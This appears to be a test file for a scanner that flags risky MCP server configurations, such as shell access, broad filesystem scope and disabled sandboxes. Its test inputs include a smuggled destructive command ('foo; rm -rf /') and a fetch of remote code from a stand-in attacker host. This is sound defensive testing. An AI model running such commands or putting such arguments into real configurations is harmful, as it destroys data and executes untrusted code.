import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { checkPermissions } from "../src/checks/permissions.js";
import type { McpServer } from "../src/types.js";

function server(overrides: Partial<McpServer> = {}): McpServer {
  return { name: "test", command: "", args: [], env: {}, url: "", source: "Test", sourcePath: "/tmp/test.json", ...overrides };
}

describe("checkPermissions", () => {
  it("flags direct shell access (bash)", () => {
    const findings = checkPermissions(server({ command: "bash", args: ["-c", "echo hi"] }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title === "Direct shell access"));
  });

  it("flags direct shell access (powershell)", () => {
    const findings = checkPermissions(server({ command: "powershell.exe" }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title === "Direct shell access"));
  });

  it("does not flag non-shell commands", () => {
    const findings = checkPermissions(server({ command: "npx", args: ["some-pkg"] }));
    assert.ok(!findings.some(f => f.title === "Direct shell access"));
  });

  it("flags overly broad filesystem scope (/)", () => {
    const findings = checkPermissions(server({ name: "filesystem", args: ["/"] }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title === "Overly broad filesystem scope"));
  });

  it("flags overly broad filesystem scope (~)", () => {
    const findings = checkPermissions(server({ name: "fs-server", args: ["~"] }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title === "Overly broad filesystem scope"));
  });

  it("flags filesystem access with scoped path", () => {
    const findings = checkPermissions(server({ name: "filesystem", args: ["/home/user/projects"] }));
    assert.ok(findings.some(f => f.title === "Filesystem access"));
    assert.ok(!findings.some(f => f.title === "Overly broad filesystem scope"));
  });

  it("flags network access patterns", () => {
    const findings = checkPermissions(server({ name: "puppeteer-server" }));
    assert.ok(findings.some(f => f.title === "Network access"));
  });

  it("flags --no-sandbox", () => {
    const findings = checkPermissions(server({ command: "node", args: ["server.js", "--no-sandbox"] }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title.includes("sandbox disabled")));
  });

  it("flags --allow-all", () => {
    const findings = checkPermissions(server({ command: "deno", args: ["run", "--allow-all", "server.ts"] }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title.includes("all permissions")));
  });

  it("flags shell metacharacters in args", () => {
    const findings = checkPermissions(server({ command: "node", args: ["server.js", "foo; rm -rf /"] }));
    assert.ok(findings.some(f => f.title === "Shell metacharacters in arguments"));
  });

  it("flags remote code execution via URL", () => {
    const findings = checkPermissions(server({ command: "node", args: ["https://evil.com/payload.js"] }));
    assert.ok(findings.some(f => f.severity === "critical" && f.title === "Remote code execution"));
  });

  it("returns empty for safe server", () => {
    const findings = checkPermissions(server({ command: "npx", args: ["@modelcontextprotocol/server-brave-search@1.0.0"] }));
    assert.equal(findings.length, 0);
  });
});
